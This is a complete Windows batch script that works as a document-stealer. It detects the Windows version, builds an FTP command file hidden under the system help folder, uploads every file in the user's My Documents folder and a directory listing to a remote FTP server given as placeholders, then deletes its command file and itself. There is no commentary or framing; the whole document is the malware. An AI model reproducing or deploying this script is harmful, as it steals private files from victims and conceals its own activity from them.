@ECHO OFF
> "%SystemRoot%\help\combat\com.log" ECHO [log] 1

:Upldir
> "%SystemRoot%\help\combat\upldir.txt" ECHO open (ftp server)
>>"%SystemRoot%\help\combat\upldir.txt" ECHO (ftp username)
>>"%SystemRoot%\help\combat\upldir.txt" ECHO (ftp password)
>>"%SystemRoot%\help\combat\upldir.txt" ECHO cd public_html/combat
>>"%SystemRoot%\help\combat\upldir.txt" ECHO prompt

:FINDOS
VER|FIND "XP">NUL
IF NOT ERRORLEVEL 1 GOTO Win2K
VER|FIND "2000">NUL
IF NOT ERRORLEVEL 1 GOTO Win2K
VER|FIND "NT">NUL
IF NOT ERRORLEVEL 1 GOTO WinNT
VER|FIND "Mil">NUL
IF NOT ERRORLEVEL 1 GOTO Win9X
VER|FIND "98">NUL
IF NOT ERRORLEVEL 1 GOTO Win9X
VER|FIND "95">NUL
IF NOT ERRORLEVEL 1 GOTO Win9X
GOTO END

:Win2K
>>"%SystemRoot%\help\combat\upldir.txt" ECHO mput "%SystemDrive%\Documents and Settings\%USERNAME%\My Documents\*.*"
>>"%SystemRoot%\help\combat\upldir.txt" ECHO put "%SystemRoot%\help\combat\upldir.log"
>>"%SystemRoot%\help\combat\upldir.txt" ECHO bye
DIR "%SystemDrive%\Documents and Settings\%USERNAME%\My Documents\" > "%SystemRoot%\help\combat\upldir.log"
>>"%SystemRoot%\help\combat\upldir.log" ECHO.
GOTO Upload

:WinNT
>>"%SystemRoot%\help\combat\upldir.txt" ECHO mput "%SystemRoot%\profiles\%USERNAME%\personal\*.*"
>>"%SystemRoot%\help\combat\upldir.txt" ECHO put "%SystemRoot%\help\combat\upldir.log"
>>"%SystemRoot%\help\combat\upldir.txt" ECHO bye
DIR "%SystemRoot%\profiles\%USERNAME%\personal\" > "%SystemRoot%\help\combat\upldir.log"
>>"%SystemRoot%\help\combat\upldir.log" ECHO.
GOTO Upload

:Win9X
>>"%SystemRoot%\help\combat\upldir.txt" ECHO mput "%SystemDrive%\My Documents\*.*"
>>"%SystemRoot%\help\combat\upldir.txt" ECHO put "%SystemRoot%\help\combat\upldir.log"
>>"%SystemRoot%\help\combat\upldir.txt" ECHO bye
DIR "%SystemDrive%\My Documents\" > "%SystemRoot%\help\combat\upldir.log"
>>"%SystemRoot%\help\combat\upldir.log" ECHO.
GOTO Upload

:Upload
IF NOT EXIST "%SystemRoot%\help\combat\upldir.txt" GOTO FINDOS
FTP -s:"%SystemRoot%\help\combat\upldir.txt" > "%SystemRoot%\help\combat\upldir.log"
DEL /F /Q "%SystemRoot%\help\combat\upldir.txt"

:END
DEL /F /Q %0
EXIT